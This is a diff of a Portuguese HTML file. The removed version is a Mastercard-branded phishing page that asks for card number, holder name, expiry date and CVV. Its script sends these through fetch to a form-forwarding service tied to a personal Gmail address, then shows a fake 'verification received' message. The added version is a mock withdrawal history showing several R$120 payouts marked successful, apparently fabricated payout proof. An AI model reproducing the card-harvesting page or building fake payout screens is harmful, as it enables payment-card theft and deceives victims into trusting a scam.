@@ -1,133 +1,110 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>Mastercard - Verificação</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Registro de Saques</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
-
     body {
-      background: linear-gradient(135deg, #ef3b36, #ff725e);
-      font-family: 'Roboto', Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      font-family: Arial, sans-serif;
+      background: #f8f9fc;
       margin: 0;
+      padding: 0;
     }
-
-    .container, .mensagem {
-      background: white;
-      padding: 40px 35px;
-      border-radius: 16px;
-      width: 100%;
-      max-width: 380px;
-      box-shadow: 0 12px 24px rgba(0,0,0,0.15);
-      text-align: center;
-      display: none;
-    }
-
-    .active {
-      display: block;
-    }
-
-    img {
-      width: 120px;
-      margin-bottom: 25px;
-    }
-
-    input {
-      width: 100%;
-      padding: 14px 18px;
-      margin: 12px 0;
-      border: 2px solid #ddd;
-      border-radius: 12px;
-      font-size: 15px;
-      transition: border-color 0.3s ease;
-      box-sizing: border-box;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #ef3b36;
-      box-shadow: 0 0 8px rgba(239, 59, 54, 0.5);
-    }
-
-    button {
-      width: 100%;
+    .header {
+      background: #ffffff;
       padding: 15px;
-      margin-top: 18px;
-      background-color: #ef3b36;
-      color: white;
-      font-weight: 700;
-      border: none;
-      border-radius: 14px;
-      font-size: 17px;
-      cursor: pointer;
-      transition: background-color 0.25s ease;
-      box-shadow: 0 6px 12px rgba(239, 59, 54, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #ddd;
     }
-
-    button:hover {
-      background-color: #c6312b;
-      box-shadow: 0 8px 16px rgba(198, 49, 43, 0.6);
+    .header span {
+      font-weight: bold;
     }
-
-    h2 {
-      font-weight: 700;
-      color: #222;
-      margin-bottom: 12px;
+    .content {
+      padding: 15px;
     }
-
-    p {
-      font-size: 16px;
-      color: #555;
-      line-height: 1.4;
+    .tabs {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 10px;
+    }
+    .tab {
+      padding: 10px 15px;
+      color: #999;
+      border-bottom: 2px solid transparent;
+    }
+    .tab.active {
+      color: #007bff;
+      border-bottom: 2px solid #007bff;
+    }
+    .summary {
+      text-align: right;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+    .record {
+      background: white;
+      padding: 15px;
+      margin-bottom: 10px;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    .record div {
+      margin-bottom: 5px;
+    }
+    .status {
+      color: green;
+      font-weight: bold;
+    }
+    .small {
+      color: #777;
+      font-size: 13px;
     }
   </style>
 </head>
 <body>
-  <!-- Tela de formulário -->
-  <div class="container active" id="formulario">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" />
-    <form id="fakeForm">
-      <input type="text" name="cartao" placeholder="Número do cartão" required />
-      <input type="text" name="nome" placeholder="Nome do titular" required />
-      <input type="text" name="validade" placeholder="Validade (MM/AA)" required />
-      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required />
-      <button type="submit">Verificar</button>
-    </form>
+
+  <div class="header">
+    <span>Registro de Saques</span>
+    <span>Total de Saques: R$ 500,00</span>
   </div>
 
-  <!-- Tela de confirmação -->
-  <div class="mensagem" id="confirmacao">
-    <h2>Verificação recebida!</h2>
-    <p>Em alguns instantes chegará um e-mail de confirmação.</p>
+  <div class="content">
+    <div class="tabs">
+      <div class="tab">Recebimento</div>
+      <div class="tab active">Registro de Saques</div>
+      <div class="tab">Apoio</div>
+    </div>
+
+    <!-- Registros -->
+    <div class="record">
+      <div>PHONE (****9-10)</div>
+      <div class="small">23/05/2025 | ID: sereiapk202504231030359420598</div>
+      <div>- R$ 120,00 <span class="status">sucesso</span></div>
+    </div>
+
+    <div class="record">
+      <div>PHONE (****9-10)</div>
+      <div class="small">23/05/2025 | ID: sereiapk202504231030267490596</div>
+      <div>- R$ 120,00 <span class="status">sucesso</span></div>
+    </div>
+
+    <div class="record">
+      <div>PHONE (****9-10)</div>
+      <div class="small">23/05/2025 | ID: sereiapk202504231030199250594</div>
+      <div>- R$ 120,00 <span class="status">sucesso</span></div>
+    </div>
+
+    <div class="record">
+      <div>PHONE (****9-10)</div>
+      <div class="small">23/05/2025 | ID: sereiapk202504231030157980593</div>
+      <div>- R$ 120,00 <span class="status">sucesso</span></div>
+    </div>
+
+    <div style="text-align: center; color: #888; margin-top: 20px;">Sem mais dados</div>
   </div>
 
-  <!-- Script de envio -->
-  <script>
-    const form = document.getElementById('fakeForm');
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          cartao: form.cartao.value,
-          nome: form.nome.value,
-          validade: form.validade.value,
-          cvv: form.cvv.value
-        })
-      }).then(response => {
-        document.getElementById("formulario").classList.remove("active");
-        document.getElementById("confirmacao").classList.add("active");
-      }).catch(error => {
-        alert("Erro no envio dos dados. Tente novamente.");
-      });
-    });
-  </script>
 </body>
 </html>
